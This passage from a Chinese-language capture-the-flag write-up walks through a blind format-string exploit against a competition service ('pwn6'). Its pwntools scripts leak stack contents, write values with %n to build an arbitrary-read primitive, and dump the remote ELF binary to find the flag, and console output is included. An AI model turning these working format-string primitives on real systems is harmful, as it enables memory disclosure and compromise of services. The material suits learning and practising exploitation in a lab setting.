class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> data<span class="token keyword">def</span> <span class="token function">leak_str</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'AAAA'</span> <span class="token operator">+</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'$s %'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'$p'</span> <span class="token operator">+</span> <span class="token string">'CCCC'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    r <span class="token operator">=</span> run_leak<span class="token punctuation">(</span>p<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    string <span class="token operator">=</span> r<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> string<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg'</span><span class="token punctuation">,</span> <span class="token number">42000</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            leaked_string <span class="token operator">=</span> leak_str<span class="token punctuation">(</span>p<span class="token punctuation">,</span> i<span class="token punctuation">)</span>            first_part <span class="token operator">=</span> leaked_string<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b' 0x'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>            address_maybe <span class="token operator">=</span> u64<span class="token punctuation">(</span>first_part<span class="token punctuation">)</span>            status <span class="token operator">=</span> <span class="token string">b"%s 0x%x %d"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>leaked_string<span class="token punctuation">,</span> address_maybe<span class="token punctuation">,</span> i<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>得到一堆输出：</p><pre class="language-txt" data-language="txt"><code class="language-txt">b&#39;%0$s %0$p 0x2430252073243025 0&#39;b&#39;\n 0x7fb9d66f6a03 0xa 1&#39;b&#39;(null) (nil) 0x2820296c6c756e28 2&#39;b&#39;\x8b \xad\xfb 0x7fe571c13980 0xfbad208b 3&#39;b&#39;XXXXAAAA%4$s %4$pCCCC 0x5633c36260a0 0x4141414158585858 4&#39;b&#39;(null) (nil) 0x2820296c6c756e28 5&#39;b&#39;\x01 0x7ffe5903f370 0x1 6&#39;b&#39;\xf3\x0f\x1e\xfaAWL\x8d&#x3D;\xa3* 0x56177ef4f2e0 0x8d4c5741fa1e0ff3 7&#39;b&#39;(null) (nil) 0x2820296c6c756e28 8&#39;b&#39;\x89\xc7\xe8\x06+\x02 0x7f11930d60b3 0x22b06e8c789 9&#39;b&#39; 0x7f896fe78620 0x0 10&#39;b&#39;\\\xefc\xbc\xfd\x7f 0x7ffdbc63d238 0x7ffdbc63ef5c 11&#39;b&#39;\xf3\x0f\x1e\xfaU1\xf6H\x8d-\x92&#x2F; 0x5648c11c5100 0x48f63155fa1e0ff3 13&#39;b&#39;\xf3\x0f\x1e\xfaAWL\x8d&#x3D;\xa3* 0x55d52ec162e0 0x8d4c5741fa1e0ff3 14&#39;b&#39;\xf3\x0f\x1e\xfa1\xedI\x89\xd1^H\x89\xe2H\x83\xe4\xf0PTL\x8d\x05F\x01 0x55b5aed8e1f0 0x8949ed31fa1e0ff3 16&#39;b&#39;\x01 0x7ffd3f6b8330 0x1 17&#39;b&#39;(null) (nil) 0x2820296c6c756e28 18&#39;b&#39;(null) (nil) 0x2820296c6c756e28 19&#39;b&#39;(null) (nil) 0x2820296c6c756e28 22&#39;b&#39;(null) (nil) 0x2820296c6c756e28 23&#39;b&#39;(null) (nil) 0x2820296c6c756e28 24&#39;b&#39;\\o-\xf3\xfc\x7f 0x7ffcf32d4ef8 0x7ffcf32d6f5c 26&#39;b&#39;a&#x2F;\x8c8\xfe\x7f 0x7ffe388c13b8 0x7ffe388c2f61 27&#39;b&#39; 0x7f4448906190 0x0 28&#39;b&#39;(null) (nil) 0x2820296c6c756e28 29&#39;b&#39;(null) (nil) 0x2820296c6c756e28 30&#39;b&#39;\xf3\x0f\x1e\xfa1\xedI\x89\xd1^H\x89\xe2H\x83\xe4\xf0PTL\x8d\x05F\x01 0x5628217c51f0 0x8949ed31fa1e0ff3 31&#39;b&#39;\x01 0x7ffc902d7a70 0x1 32&#39;b&#39;(null) (nil) 0x2820296c6c756e28 33&#39;b&#39;(null) (nil) 0x2820296c6c756e28 34&#39;b&#39;\xf4\x90H\x8d&#x3D;). 0x560a948af21e 0x2e293d8d4890f4 35&#39;b&#39;\x1c 0x7fff0fb76318 0x1c 36&#39;b&#39;pwn6 0x7ffdf4d72f5c 0x366e7770 39&#39;b&#39;(null) (nil) 0x2820296c6c756e28 40&#39;b&#39;PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin 0x7ffdd55a4f61 0x73752f3d48544150 41&#39;b&#39;HOSTNAME&#x3D;70e208321dbb 0x7ffd95f00fa3 0x454d414e54534f48 42&#39;b&#39;user&#x3D;pwn6 0x7fffabdc8fb9 0x6e77703d72657375 43&#39;b&#39;HOME&#x3D;&#x2F;home&#x2F;pwn6 0x7ffd44407fc3 0x6f682f3d454d4f48 44&#39;b&#39;REMOTE_HOST&#x3D;10.0.0.3 0x7ffea9b30fd3 0x485f45544f4d4552 45&#39;b&#39;(null) (nil) 0x2820296c6c756e28 46&#39;b&#39;\x7fELF\x02\x01\x01 0x7ffe8beb9000 0x10102464c457f 48&#39;b&#39;\x06 0x5608a1023040 0x6 56&#39;b&#39;\x7fELF\x02\x01\x01 0x7f224ba9c000 0x10102464c457f 62&#39;b&#39;(null) (nil) 0x2820296c6c756e28 64&#39;b&#39;\xf3\x0f\x1e\xfa1\xedI\x89\xd1^H\x89\xe2H\x83\xe4\xf0PTL\x8d\x05F\x01 0x55dec82f61f0 0x8949ed31fa1e0ff3 66&#39;b&#39;(null) (nil) 0x2820296c6c756e28 76&#39;b&#39;\xf5I\xa3n&lt;\x86\xd6\x13\xbb\xa9$\xdf6\xd5\x86\xddx86_64 0x7ffe30e7adb9 0x13d6863c6ea349f5 78&#39;b&#39;(null) (nil) 0x2820296c6c756e28 80&#39;b&#39;&#x2F;home&#x2F;pwn6&#x2F;pwn6 0x7ffed176ffe8 0x77702f656d6f682f 82&#39;b&#39;x86_64 0x7ffd8dd10819 0x34365f363878 84&#39;</code></pre><p>为了让程序泄露出更多的信息，我们需要一个任意指针并开始泄漏数据。下面的脚本中，<code>run_leak(p, b&#39;%57001c%26$n&#39;)</code>一行，可以将<code>0xdead</code>值写入到堆栈的索引中。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">run_leak</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    prefix <span class="token operator">=</span> <span class="token string">b"XXXX"</span>    total <span class="token operator">=</span> prefix <span class="token operator">+</span> payload    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>total<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span>    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> data<span class="token keyword">def</span> <span class="token function">leak_str</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> windex<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'AAAA'</span> <span class="token operator">+</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'$p'</span> <span class="token operator">+</span> <span class="token string">'CCCC'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    r <span class="token operator">=</span> run_leak<span class="token punctuation">(</span>p<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    string <span class="token operator">=</span> r<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> string<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg'</span><span class="token punctuation">,</span> <span class="token number">42000</span><span class="token punctuation">)</span>    baseline <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    i <span class="token operator">=</span> <span class="token number">17</span>    run_leak<span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token string">b'%57001c%26$n'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        leaked_string <span class="token operator">=</span> leak_str<span class="token punctuation">(</span>p<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">b'nil'</span> <span class="token keyword">in</span> leaked_string <span class="token keyword">or</span> <span class="token string">b'$'</span> <span class="token keyword">in</span> leaked_string<span class="token punctuation">:</span>            pointer <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            pointer <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>leaked_string<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>        baseline<span class="token punctuation">.</span>append<span class="token punctuation">(</span>pointer<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>baseline<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%-3d 0x%x"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> baseline<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>当索引<code>26</code>的地址进行写操作时，索引<code>39</code>的地址被<code>0xdead</code>覆盖最后四位。</p><pre class="language-txt" data-language="txt"><code class="language-txt">...17  0x7ffe079258b018  0x019  0x020  0xf5fe6c5e253d755021  0xf45110276a53755022  0x023  0x024  0x025  0x126  0x7ffe079258b827  0x7ffe079258c828  0x7f29b9cee19029  0x030  0x031  0x5634bfab41f032  0x7ffe079258b033  0x034  0x035  0x5634bfab421e36  0x7ffe079258a837  0x1c38  0x139  0x7ffe0000dead...</code></pre><p>此时，我们就获得一个原语。由于索引<code>39</code>包含堆栈地址，我们可以对其修改，让其作为跳板将数据写入另一个索引，这样就可以指向堆栈中的任意点，形如<code>stack ptr 1 -&gt; stack ptr 2 -&gt; somewhere in the stack</code>。<br>接下来，需要找寻文件的基址，这里可以使用<code>.bbs</code>中的字符串地址和对应的掩码。ELF头是以<code>ELF</code>开头，经过一系列尝试，掩码为<code>0xffffffffffffe000</code>有很大可能得到正确的地址。完整的脚本如下：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> pwnlib<span class="token comment">#context.log_level = 'debug'</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">run_leak</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    prefix <span class="token operator">=</span> <span class="token string">b"XXXX"</span>    postfix <span class="token operator">=</span> <span class="token string">b'ZZZZ'</span>    total <span class="token operator">=</span> prefix <span class="token operator">+</span> payload <span class="token operator">+</span> postfix    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>total<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span>    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>postfix<span class="token punctuation">)</span>    <span class="token keyword">return</span> data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">adjust_bouncer</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> base<span class="token punctuation">,</span> index<span class="token punctuation">,</span> offset<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Adjust the value of index 39 to point at a particular index.</span>    address <span class="token operator">=</span> base <span class="token operator">+</span> <span class="token punctuation">(</span>index <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> offset    lower_address <span class="token operator">=</span> address <span class="token operator">&amp;</span> <span class="token number">0xffff</span>    payload <span class="token operator">=</span> <span class="token string">b'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>lower_address<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'c%26$hn'</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">leak_address</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'$p'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    r <span class="token operator">=</span> run_leak<span class="token punctuation">(</span>p<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    address <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> address<span class="token keyword">def</span> <span class="token function">leak_data</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'$s'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    r <span class="token operator">=</span> run_leak<span class="token punctuation">(</span>p<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    <span class="token keyword">return</span> r<span class="token keyword">def</span> <span class="token function">write_single</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Value must be a 2 bytes short</span>    <span class="token keyword">if</span> value <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">b'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'c%39$hn'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">b'%39$hn'</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">write_index</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> index_base<span class="token punctuation">,</span> index<span class="token punctuation">,</span> address<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Writes an arbitrary value to an index.</span>    <span class="token keyword">if</span> index <span class="token operator">==</span> <span class="token number">39</span><span class="token punctuation">:</span>        <span class="token comment"># NOT ALLOWEEED</span>        <span class="token keyword">return</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        current_portion <span class="token operator">=</span> <span class="token punctuation">(</span>address <span class="token operator">>></span> <span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span>        adjust_bouncer<span class="token punctuation">(</span>p<span class="token punctuation">,</span> index_base<span class="token punctuation">,</span> index<span class="token punctuation">,</span> offset<span class="token operator">=</span>i<span class="token punctuation">)</span>        write_single<span class="token punctuation">(</span>p<span class="token punctuation">,</span> current_portion<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">arbitrary_read</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> index_base<span class="token punctuation">,</span> address<span class="token punctuation">)</span><span class="token punctuation">:</span>    write_index<span class="token punctuation">(</span>p<span class="token punctuation">,</span> index_base<span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> address<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> leak_data<span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> data<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg'</span><span class="token punctuation">,</span> <span class="token number">42000</span><span class="token punctuation">)</span>    <span class="token comment"># Index 17 points to Index 38</span>    <span class="token comment"># Figure out address of Index 38</span>    index_17_value <span class="token operator">=</span> leak_address<span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">)</span>    index_38_address <span class="token operator">=</span> index_17_value    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"Got address of index 38: 0x%x"</span> <span class="token operator">%</span> index_38_address<span class="token punctuation">)</span>    <span class="token comment"># Figure out index 0</span>    index_base <span class="token operator">=</span> index_38_address <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">38</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"RSP (index 0): 0x%x"</span> <span class="token operator">%</span> index_base<span class="token punctuation">)</span>    <span class="token comment"># Figure out the halfed address to index 39</span>    index_26_value <span class="token operator">=</span> leak_address<span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"Got address of index 26 (index 39): 0x%x"</span> <span class="token operator">%</span> index_26_value<span class="token punctuation">)</span>    index_39_value <span class="token operator">=</span> leak_address<span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"Got value of index 39: 0x%x"</span> <span class="token operator">%</span> index_39_value<span class="token punctuation">)</span>    <span class="token comment"># Leak address of the format string just to verify.</span>    index_4_value <span class="token operator">=</span> leak_address<span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"Got address of index 4 (format string): 0x%x"</span> <span class="token operator">%</span> index_4_value<span class="token punctuation">)</span>    <span class="token comment"># Leak address of possible .text.</span>    index_7_value <span class="token operator">=</span> leak_address<span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"Got address of index 7 (format string): 0x%x"</span> <span class="token operator">%</span> index_7_value<span class="token punctuation">)</span>    elf_start <span class="token operator">=</span> index_7_value <span class="token operator">&amp;</span> <span class="token number">0xffffffffffffe000</span>    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"ELF Start: 0x%x"</span> <span class="token operator">%</span> elf_start<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> arbitrary_read<span class="token punctuation">(</span>p<span class="token punctuation">,</span> index_base<span class="token punctuation">,</span> address<span class="token punctuation">)</span>    elf_header <span class="token operator">=</span> leak<span class="token punctuation">(</span>elf_start<span class="token punctuation">)</span>    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"ELF Start Bytes: %s"</span> <span class="token operator">%</span> elf_header<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'\x7fELF\x02\x01\x01'</span> <span class="token operator">!=</span> elf_header<span class="token punctuation">:</span>        log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'Attempt failed.'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span>    elf_contents <span class="token operator">=</span> elf_header <span class="token operator">+</span> <span class="token string">b'\x00'</span>    offset <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>elf_contents<span class="token punctuation">)</span>    fd <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"stolen_elf"</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span>    fd<span class="token punctuation">.</span>write<span class="token punctuation">(</span>elf_contents<span class="token punctuation">)</span>    running_index <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            next_content <span class="token operator">=</span> leak<span class="token punctuation">(</span>elf_start <span class="token operator">+</span> offset<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span>            elf_contents <span class="token operator">+=</span> next_content            offset <span class="token operator">+=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>next_content<span class="token punctuation">)</span>            <span class="token comment">#print(offset, next_content)</span>            fd<span class="token punctuation">.</span>write<span class="token punctuation">(</span>next_content<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">b'TISC20'</span> <span class="token keyword">in</span> next_content<span class="token punctuation">:</span>                flag <span class="token operator">=</span> next_content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>                log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'Discovered flag: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token builtin">float</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>elf_contents<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">100</span> <span class="token operator">></span> running_index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">:</span>                log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"Got &#123;&#125; bytes of ELF data so far."</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>elf_contents<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                running_index <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"Got EOF, leaked all we could."</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"Obtained &#123;&#125; bytes of ELF file."</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>elf_contents<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"Flag: &#123;&#125;."</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>当脚本能成功运行时，检测到ELF头文件，转存为ELF二进制文件。经过很长时间的运行，最终得到falg： </p><pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ python exploit6.py<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Opening connection to fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg on port <span class="token number">42000</span>: Done<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got address of index <span class="token number">38</span>: 0x7ffca01db940<span class="token punctuation">[</span>*<span class="token punctuation">]</span> RSP <span class="token punctuation">(</span>index <span class="token number">0</span><span class="token punctuation">)</span>: 0x7ffca01db810<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got address of index <span class="token number">26</span> <span class="token punctuation">(</span>index <span class="token number">39</span><span class="token punctuation">)</span>: 0x7ffca01db948<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got value of index <span class="token number">39</span>: 0x7ffca01dcf5c<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got address of index <span class="token number">4</span> <span class="token punctuation">(</span>format string<span class="token punctuation">)</span>: 0x5557a54680a0<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got address of index <span class="token number">7</span> <span class="token punctuation">(</span>format string<span class="token punctuation">)</span>: 0x5557a54652e0<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ELF Start: 0x5557a5464000<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ELF Start Bytes: b<span class="token string">'<span class="token entity" title="\x7f">\x7f</span>ELF<span class="token entity" title="\x02">\x02</span><span class="token entity" title="\x01">\x01</span><span class="token entity" title="\x01">\x01</span>'</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got <span class="token number">9</span> bytes of ELF data so far.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got <span class="token number">101</span> bytes of ELF data so far.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got <span class="token number">201</span> bytes of ELF data so far.<span class="token 